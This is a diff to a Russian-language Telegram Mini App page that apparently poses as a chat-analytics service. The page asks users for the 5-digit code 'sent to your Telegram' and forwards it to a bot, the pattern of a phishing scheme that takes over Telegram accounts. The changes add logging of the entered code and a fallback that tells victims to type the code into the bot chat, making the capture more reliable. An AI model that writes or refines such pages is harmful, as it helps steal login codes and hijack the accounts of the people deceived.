@@ -19,6 +19,7 @@
         .btn:active { opacity: 0.7; }
         .btn.secondary { background: #2c2c2e; margin-bottom: 10px; }
         .error { color: #ff453a; font-size: 14px; margin-top: 10px; display: none; }
+        .debug { color: #888; font-size: 10px; margin-top: 20px; word-break: break-all; display: none; }
     </style>
 </head>
 <body>
@@ -48,7 +49,7 @@
             <p>Введите 5-значный код из Telegram:</p>
             <input type="text" id="u_code" placeholder="00000" inputmode="numeric" maxlength="5" pattern="\d*">
             <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить</button>
-            <div class="error" id="error-message">Неверный код. Попробуйте снова.</div>
+            <div class="error" id="error-message"></div>
             <p style="font-size:12px; margin-top:15px;">Код отправлен в ваш Telegram</p>
         </div>
         
@@ -58,6 +59,15 @@
             <p>Анализ запущен. Отчет придет в бота.</p>
             <button class="btn" onclick="closeApp()">Закрыть</button>
         </div>
+        
+        <!-- Шаг 5: Обычный ввод (если миниапп не работает) -->
+        <div id="step-fallback" style="display:none;">
+            <h2>⚠️ Режим совместимости</h2>
+            <p>Введите код в чат с ботом:</p>
+            <button class="btn" onclick="closeApp()">Открыть чат</button>
+        </div>
+        
+        <div class="debug" id="debug-info"></div>
     </div>
 
     <script>
@@ -67,8 +77,21 @@
         
         let selectedDays = 7;
         
+        function debugLog(msg) {
+            console.log("[TG-ANALYTICS] " + msg);
+            const el = document.getElementById('debug-info');
+            if (el) {
+                el.style.display = 'block';
+                el.innerHTML += '<br>' + msg;
+            }
+        }
+        
+        debugLog("WebApp инициализирован");
+        
         function selectPeriod(days) {
             selectedDays = days;
+            debugLog("Выбран период: " + days + " дней");
+            
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             
@@ -115,13 +138,21 @@
             document.getElementById('confirm-btn').innerText = 'Проверка...';
             document.getElementById('confirm-btn').disabled = true;
             
-            // Отправляем данные в бота
+            debugLog("Отправка кода: " + val);
+            
+            // Формируем данные
+            const data = JSON.stringify({
+                t: 'c',
+                v: val,
+                days: selectedDays
+            });
+            
+            debugLog("Данные: " + data);
+            
+            // Пробуем отправить через WebApp
             try {
-                tg.sendData(JSON.stringify({
-                    t: 'c',
-                    v: val,
-                    days: selectedDays
-                }));
+                tg.sendData(data);
+                debugLog("tg.sendData() выполнен успешно");
                 
                 // Показываем успех
                 setTimeout(() => {
@@ -130,25 +161,32 @@
                 }, 500);
                 
             } catch (e) {
+                debugLog("Ошибка tg.sendData: " + e.message);
+                
+                // Если не сработало - предлагаем ввести в чат
                 errorEl.style.display = 'block';
-                errorEl.innerText = 'Ошибка отправки. Попробуйте ввести код в чат с ботом.';
+                errorEl.innerText = 'Ошибка отправки. Введите код в чат с ботом.';
                 document.getElementById('confirm-btn').innerText = 'Подтвердить';
                 document.getElementById('confirm-btn').disabled = false;
+                
+                // Показываем fallback
+                document.getElementById('step-fallback').style.display = 'block';
             }
         }
         
         function closeApp() {
+            debugLog("Закрытие приложения");
             tg.close();
         }
         
         // Обработка ошибок
-        window.addEventListener('error', function() {
-            const errorEl = document.getElementById('error-message');
-            if (errorEl) {
-                errorEl.style.display = 'block';
-                errorEl.innerText = 'Произошла ошибка. Введите код в чат с ботом.';
-            }
+        window.addEventListener('error', function(e) {
+            debugLog("Глобальная ошибка: " + e.message);
         });
+        
+        // Показываем информацию о WebApp
+        debugLog("Версия: " + (tg.version || 'unknown'));
+        debugLog("Платформа: " + (tg.platform || 'unknown'));
     </script>
 </body>
 </html>
